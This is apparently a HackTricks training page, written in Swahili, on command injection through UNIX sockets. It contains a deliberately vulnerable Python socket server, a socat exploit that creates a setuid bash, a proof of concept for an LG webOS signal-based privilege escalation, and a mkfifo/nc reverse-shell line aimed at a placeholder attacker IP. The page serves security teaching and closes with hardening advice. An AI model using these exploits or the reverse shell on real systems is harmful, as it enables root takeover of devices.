# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Mfano wa socket binding kwa Python

Katika mfano ufuatao, **unix socket inaundwa** (`/tmp/socket_test.s`) na kila kitu **kinachopokelewa** kita-**executed** na `os.system`.Najua kwamba hutakutana na hili kwenye mazingira halisi, lakini lengo la mfano huu ni kuona jinsi code inayotumia unix sockets inavyoonekana, na jinsi ya kushughulikia input katika hali mbaya zaidi iwezekanavyo.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Tekeleza** code ukitumia python: `python s.py` na **angalia jinsi socket inavyosikiliza**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Uchunguzi wa kifani: Escalation inayochochewa na signal kupitia UNIX socket inayomilikiwa na root (LG webOS)

Baadhi ya daemon zenye privileges huweka wazi UNIX socket inayomilikiwa na root, inayokubali input isiyoaminika na kuunganisha vitendo vyenye privileges na thread-IDs pamoja na signals. Ikiwa protocol inamruhusu client asiye na privileges kuathiri native thread inayolengwa, huenda ukaweza kuchochea code path yenye privileges na kufanya escalation.<sup>[[1]](#references)[[2]](#references)</sup>

Maelezo makuu ya tukio na disclosure yanaeleza mfuatano ufuatao.<sup>[[1]](#references)[[2]](#references)</sup>

Muundo ulioonekana:
- Unganisha kwenye socket inayomilikiwa na root (kwa mfano, /tmp/remotelogger).
- Unda thread na upate native thread id (TID) yake.
- Tuma TID (ikiwa imefungashwa) pamoja na padding kama request; pokea acknowledgement.
- Tuma signal mahususi kwa TID hiyo ili kuchochea tabia yenye privileges.

PoC fupi hapa chini inafuata mfuatano huo.<sup>[[1]](#references)[[2]](#references)</sup>
Muhtasari wa PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Ili kuibadilisha hii kuwa root shell, muundo rahisi wa named-pipe + nc unaweza kutumika.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Aina hii ya bugs hutokea kutokana na kuamini values zinazotokana na client state isiyo na privileged access (TIDs) na kuziunganisha na signal handlers au logic yenye privileged access.<sup>[[1]](#references)</sup>
- Imarisha usalama kwa kutekeleza credentials kwenye socket, kuthibitisha message formats, na kutenganisha privileged operations na thread identifiers zinazotolewa externally.

## References

- [1] [Jailbreak webOS kwa ajili ya burudani (kwa ajili ya burudani tu)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS Path Traversal, Authentication Bypass na Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
